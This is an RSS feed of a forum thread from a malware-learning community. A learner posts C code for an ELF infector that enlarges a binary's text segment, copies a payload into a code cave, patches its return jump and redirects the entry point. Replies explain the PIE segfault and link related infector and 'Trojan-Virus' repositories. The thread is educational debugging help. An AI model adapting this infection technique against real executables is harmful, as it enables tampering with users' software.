@@ -1,0 +1,360 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>ELF Injector Patching Issues</title>
+    <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714</link>
+    <description>I&#39;ve been working on an ELFInjector inspired by @0x00pf  and analyzing his code and  using his payload from his github: https://github.com/0x00pf/0x00sec_code/blob/master/elfun/payload.asm
+
+My Code: https://github.com/digitalXmage/Elf-Injector-learning-
+
+Everything works as expected, I Successfully insert the payload and if i don&#39;t change the entry point, the original code runs, as expected. If i change the entry point to the payload offset in the target file. The payload runs, However a segfault happens at the jmp instruction. It seems. So the issue seems to occur when I then have to patch the jmp instruction of the payload to jump back to the original entry point.
+
+So I&#39;m guessing that the elf injector is not editing the jmp instruction correctly. Here&#39;s the function for the patching:
+
+    
+    #define RET_PATTERN 0x11111111
+
+    struct file_info   /*[0] = starting address and [1] = size*/
+    {
+	uint64_t cave[2];
+	uint64_t next_seg[2];
+	uint64_t text_seg[2];
+	uint64_t ep;
+	uint64_t payload_size;
+    } file;
+
+*Further Down Injector.c , we have the following function for patching (which makes use
+of struct file_info which contains information about the target file and the payload)
+            
+    /*insert the extracted payload into the code cave*/
+    void insert_payload(Elf64_Shdr payload,int no_segs,Elf64_Phdr *phdr,Elf64_Ehdr *ehdr,uint8_t *mem,uint8_t *payload_data)
+    {
+	    /*find .text segment*/
+	    for(int i=0;i&lt;=no_segs;i++)
+	    {
+	    	if(phdr[i].p_type==PT_LOAD &amp;&amp; phdr[i].p_flags == 5)
+		    {
+
+		    	/*increase the size of text segment to accomadate the payload*/
+		    	phdr[i].p_memsz += (file.payload_size);
+	    		phdr[i].p_filesz += (file.payload_size);
+		
+			
+
+		    	/*move the payload at the end of the segment(start of code cave)*/
+		    	memmove(mem+file.cave[0],payload_data + payload.sh_offset,payload.sh_size);
+
+
+		    	/*patch return address*/
+		    	unsigned char *ptr;
+			    long data;
+			    int y,r;
+			
+			 /*pointer to code*/
+		        ptr = (unsigned char *)mem+file.cave[0];
+	
+			 for(y=0;y&lt;(int)file.payload_size;y++)
+			 {
+				/*get value under pointer pluss offset*/
+				data = *((long*)(ptr+y));
+				r = data ^(long)RET_PATTERN;
+
+				/*check matching pattern*/
+				if(r==0)
+				{
+					printf(&quot;*return address found*\n&quot;);
+					printf(&quot;+ Pattern %1x found at offset %d -&gt; %1x\n&quot;,RET_PATTERN,y,file.ep);
+					*((long *)(ptr+y)) = file.ep; //set jmp instruction of payload to original entry point 
+					break;
+				}
+			}			
+				ehdr-&gt;e_entry = file.cave[0]; //set entry point to the code cave
+			
+		       	break;	
+		}
+	}	
+    }
+
+
+
+*Testing the code
+
+&gt; ./compile
+./injector target payload
+./target
+This file has been infected for 0x00SEC
+Segmentation fault
+
+I&#39;ve done some debugging with gdb on injector.c and I can&#39;t seem to find the problem. I&#39;m patching the jmp instruction to the correct address, being the target&#39;s original entry point. I even looked through the assembly program, which appears the segmentation fault occurs. However it seems my injector.c isn&#39;t patching as expected, even though it seems to? And is able to find the jmp instruction in memory.
+
+Honestly This is my last resort. I wouldn&#39;t of posted here, If i wasn&#39;t desperate and tried everything i could think of. Like i say To get a better understanding and test yourself, Go to my github link for the code, and It&#39;s annotated for easy reading etc.
+
+I just don&#39;t seem to understand why the patching isn&#39;t working as expected? I&#39;m 90% sure the segmentation fault occurs because of the jmp instruction, and thus shouldn&#39;t occur when we change the payload&#39;s jmp instruction to a valid address in memory.
+
+*Note: My code is a very rough draft, Apologies for any confusion or readability issues. ANd I&#39;m aware some variables are unused. This was just a quick draft.</description>
+    
+    <lastBuildDate>Sat, 17 Oct 2020 18:36:41 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/11</link>
+        <pubDate>Tue, 15 Dec 2020 03:29:50 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-11</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[0xN3utr0n]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi, sorry if I’m bumping the thread, I was just passing by and noticed this interesting post. While learning I also went through all the trouble of making an <a href="https://github.com/0xN3utr0n/Noteme" rel="noopener nofollow ugc">infector</a> by myself, and perhaps mine could be of some help to <a class="mention" href="https://d.clarkee.co.uk/u/digitalxmage">@digitalXmage</a> since it can infect shared objects.</p>
+<p>PS: I too am very grateful to <a class="mention" href="https://d.clarkee.co.uk/u/0x00pf">@0x00pf</a>, he was a great inspiration back then when I started.  <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/10</link>
+        <pubDate>Sat, 17 Oct 2020 14:17:13 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-10</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>I see now. You should be closer to your goals now because a binary PIE is basically a shared library. I haven’t played with libraries myself but looks like an interesting project. Do not forget to post your findings here</p>
+<p>Thanks for reading my posts and I’m very glad to hear they helped you.</p>
+<p>Looking forward to know more about those binary patching projects</p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/9</link>
+        <pubDate>Sat, 05 Sep 2020 21:14:57 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-9</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[digitalXmage]]></dc:creator>
+        <description><![CDATA[
+            <p>Awesome will take a look. So just to clarify as I think I didn’t explain it well.</p>
+<p>I didn’t use the typical payload executable per say, I used nasm and changed the format to a .bin (flat form binary). I then did the usual of mapping the Host file. Setting up the code cave, I then opened up the .bin payload onto the heap, I then changed/patched the return address to the host’s original entry point, and Then I memmoved the opened payload on the heap into the code cave(after patching) Which seemed to of worked for some reason. Whereas if i patched after inserting the payload into the code cave,It didn’t patch it.</p>
+<p>However It only works with ELF of type exec. I’m assuming It’s because the address space doesn’t change? But it’s still a hunch , I’m still learning.</p>
+<p>Here is the github to my new solved version. I need to find a way of infecting Dyn shared files. However I’m currently still working on that. And your information in this post has helped so much!</p>
+<p><a href="https://github.com/digitalXmage/Trojan-Virus" rel="nofollow noopener">https://github.com/digitalXmage/Trojan-Virus</a></p>
+<p>Thank you for your posts btw(And everyone else) But you in particular have been a massive source of knowledge and inspiration. And have ignited my passion for Binary patching(I’m working on more binary patching projects) I even follow you on github. I’m looking forward to your next project man <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/8</link>
+        <pubDate>Sat, 05 Sep 2020 21:02:21 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-8</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="digitalXmage" data-post="6" data-topic="22714">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/letter_avatar_proxy/v4/letter/d/ea666f/48.png" class="avatar"> digitalXmage:</div>
+<blockquote>
+<p>I patched the actual source code of the payload and copied the source code into the code cave</p>
+</blockquote>
+</aside>
+<p>That sounds weird. Can you show us the code?</p>
+<p>Also, I noticed that I updated my repos for this issue. You can check a possible solution here:</p>
+<aside class="onebox githubfolder" data-onebox-src="https://github.com/0x00pf/0x00sec_code/tree/master/elfpie">
+  <header class="source">
+      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" alt="" width="32" height="32">
+
+      <a href="https://github.com/0x00pf/0x00sec_code/tree/master/elfpie" target="_blank" rel="noopener nofollow ugc">github.com</a>
+  </header>
+
+  <article class="onebox-body">
+    <h3><a href="https://github.com/0x00pf/0x00sec_code/tree/master/elfpie" target="_blank" rel="noopener nofollow ugc">0x00sec_code/elfpie at master · 0x00pf/0x00sec_code</a></h3>
+
+
+  <p><span class="label1">Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</span></p>
+
+  </article>
+
+  <div class="onebox-metadata">
+    
+    
+  </div>
+
+  <div style="clear: both"></div>
+</aside>
+
+<p>There is an alternative solution from <a class="mention" href="https://d.clarkee.co.uk/u/jbx81">@jbx81</a>  in this post</p>
+<p><a href="https://0x00sec.org/t/doubt-infect-elf/13605/4" class="onebox" target="_blank" rel="noopener nofollow ugc">https://0x00sec.org/t/doubt-infect-elf/13605/4</a></p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/7</link>
+        <pubDate>Sat, 05 Sep 2020 20:31:51 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-7</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[digitalXmage]]></dc:creator>
+        <description><![CDATA[
+            <p>Thank you, It’s been a real help and insight. I managed to solve it, But i Don’t know how to edit the original post.</p>
+<p>What i Did was, I followed the the algorithm for patching, However instead of patching the payload in binary form, I patched the actual source code of the payload and copied the source code into the code cave , the text segment. And it seemed to of worked.</p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/6</link>
+        <pubDate>Sat, 05 Sep 2020 20:24:36 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-6</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi <a class="mention" href="https://d.clarkee.co.uk/u/digitalxmage">@digitalXmage</a>,</p>
+<p>Are you maybe working with PIE binaries?. Check this out.</p>
+<p><a href="https://0x00sec.org/t/segfaults-with-polycrypt-tutorial/6713" class="onebox" target="_blank" rel="noopener nofollow ugc">https://0x00sec.org/t/segfaults-with-polycrypt-tutorial/6713</a></p>
+<p>and this</p>
+<p><a href="https://0x00sec.org/t/issues-with-elf-file-injection-tutorial-by-pico/8029" class="onebox" target="_blank" rel="noopener nofollow ugc">https://0x00sec.org/t/issues-with-elf-file-injection-tutorial-by-pico/8029</a></p>
+<p>The method doesn’t work with PIE, it needs to be updated to use a <code>RIP</code> relative jump instead of the absolute jump used in the original post, because an absolute jump doesn’t work on a PIE binary as it may be anywhere in memory</p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/5</link>
+        <pubDate>Mon, 31 Aug 2020 19:31:21 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-5</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[messede]]></dc:creator>
+        <description><![CDATA[
+            <p>Its radare2<br>
+<a href="https://www.radare.org/r/" class="onebox" target="_blank">https://www.radare.org/r/</a></p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/4</link>
+        <pubDate>Tue, 18 Aug 2020 11:27:44 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-4</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[digitalXmage]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for replying. What software are you using to analyze the code?</p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/3</link>
+        <pubDate>Tue, 18 Aug 2020 10:16:15 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-3</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[messede]]></dc:creator>
+        <description><![CDATA[
+            <p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/0a5275a8383f802573f2fb5c2f73151a55cc5f24.png" data-download-href="/uploads/short-url/1tjrv7cfeR3RPETs6LC2630xO9m.png?dl=1" title="image"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0a5275a8383f802573f2fb5c2f73151a55cc5f24_2_690x72.png" alt="image" data-base62-sha1="1tjrv7cfeR3RPETs6LC2630xO9m" width="690" height="72" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0a5275a8383f802573f2fb5c2f73151a55cc5f24_2_690x72.png, https://0x00sec.s3.amazonaws.com/optimized/2X/0/0a5275a8383f802573f2fb5c2f73151a55cc5f24_2_1035x108.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/0/0a5275a8383f802573f2fb5c2f73151a55cc5f24_2_1380x144.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/0a5275a8383f802573f2fb5c2f73151a55cc5f24_2_10x10.png"></a></div><p></p>
+<p>------------------[Payload]-----------------|------------------------[Patched Binary]-----------------------------------------</p>
+<p>The jump is never made in the target (patched) binary , i guess the payload is not being patched properly , some offset issue probably .</p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/2</link>
+        <pubDate>Sun, 16 Aug 2020 07:24:51 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-2</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+      <item>
+        <title>ELF Injector Patching Issues</title>
+        <dc:creator><![CDATA[digitalXmage]]></dc:creator>
+        <description><![CDATA[
+            <p>I’ve been working on an ELFInjector inspired by <a class="mention" href="https://d.clarkee.co.uk/u/0x00pf">@0x00pf</a>  and analyzing his code and  using his payload from his github: <a href="https://github.com/0x00pf/0x00sec_code/blob/master/elfun/payload.asm" class="inline-onebox" rel="noopener nofollow ugc">0x00sec_code/elfun/payload.asm at master · 0x00pf/0x00sec_code · GitHub</a></p>
+<p>My Code: <a href="https://github.com/digitalXmage/Elf-Injector-learning-" rel="noopener nofollow ugc">https://github.com/digitalXmage/Elf-Injector-learning-</a></p>
+<p>Everything works as expected, I Successfully insert the payload and if i don’t change the entry point, the original code runs, as expected. If i change the entry point to the payload offset in the target file. The payload runs, However a segfault happens at the jmp instruction. It seems. So the issue seems to occur when I then have to patch the jmp instruction of the payload to jump back to the original entry point.</p>
+<p>So I’m guessing that the elf injector is not editing the jmp instruction correctly. Here’s the function for the patching:</p>
+<pre><code>#define RET_PATTERN 0x11111111
+
+struct file_info   /*[0] = starting address and [1] = size*/
+{
+uint64_t cave[2];
+uint64_t next_seg[2];
+uint64_t text_seg[2];
+uint64_t ep;
+uint64_t payload_size;
+} file;
+</code></pre>
+<p>*Further Down Injector.c , we have the following function for patching (which makes use<br>
+of struct file_info which contains information about the target file and the payload)</p>
+<pre><code>/*insert the extracted payload into the code cave*/
+void insert_payload(Elf64_Shdr payload,int no_segs,Elf64_Phdr *phdr,Elf64_Ehdr *ehdr,uint8_t *mem,uint8_t *payload_data)
+{
+    /*find .text segment*/
+    for(int i=0;i&lt;=no_segs;i++)
+    {
+    	if(phdr[i].p_type==PT_LOAD &amp;&amp; phdr[i].p_flags == 5)
+	    {
+
+	    	/*increase the size of text segment to accomadate the payload*/
+	    	phdr[i].p_memsz += (file.payload_size);
+    		phdr[i].p_filesz += (file.payload_size);
+	
+		
+
+	    	/*move the payload at the end of the segment(start of code cave)*/
+	    	memmove(mem+file.cave[0],payload_data + payload.sh_offset,payload.sh_size);
+
+
+	    	/*patch return address*/
+	    	unsigned char *ptr;
+		    long data;
+		    int y,r;
+		
+		 /*pointer to code*/
+	        ptr = (unsigned char *)mem+file.cave[0];
+
+		 for(y=0;y&lt;(int)file.payload_size;y++)
+		 {
+			/*get value under pointer pluss offset*/
+			data = *((long*)(ptr+y));
+			r = data ^(long)RET_PATTERN;
+
+			/*check matching pattern*/
+			if(r==0)
+			{
+				printf("*return address found*\n");
+				printf("+ Pattern %1x found at offset %d -&gt; %1x\n",RET_PATTERN,y,file.ep);
+				*((long *)(ptr+y)) = file.ep; //set jmp instruction of payload to original entry point 
+				break;
+			}
+		}			
+			ehdr-&gt;e_entry = file.cave[0]; //set entry point to the code cave
+		
+	       	break;	
+	}
+}	
+}
+</code></pre>
+<p>*Testing the code</p>
+<blockquote>
+<p>./compile<br>
+./injector target payload<br>
+./target<br>
+This file has been infected for 0x00SEC<br>
+Segmentation fault</p>
+</blockquote>
+<p>I’ve done some debugging with gdb on injector.c and I can’t seem to find the problem. I’m patching the jmp instruction to the correct address, being the target’s original entry point. I even looked through the assembly program, which appears the segmentation fault occurs. However it seems my injector.c isn’t patching as expected, even though it seems to? And is able to find the jmp instruction in memory.</p>
+<p>Honestly This is my last resort. I wouldn’t of posted here, If i wasn’t desperate and tried everything i could think of. Like i say To get a better understanding and test yourself, Go to my github link for the code, and It’s annotated for easy reading etc.</p>
+<p>I just don’t seem to understand why the patching isn’t working as expected? I’m 90% sure the segmentation fault occurs because of the jmp instruction, and thus shouldn’t occur when we change the payload’s jmp instruction to a valid address in memory.</p>
+<p>*Note: My code is a very rough draft, Apologies for any confusion or readability issues. ANd I’m aware some variables are unused. This was just a quick draft.</p>
+          <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714/1</link>
+        <pubDate>Sat, 15 Aug 2020 11:24:52 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-22714-1</guid>
+        <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
+      </item>
+  </channel>
+</rss>
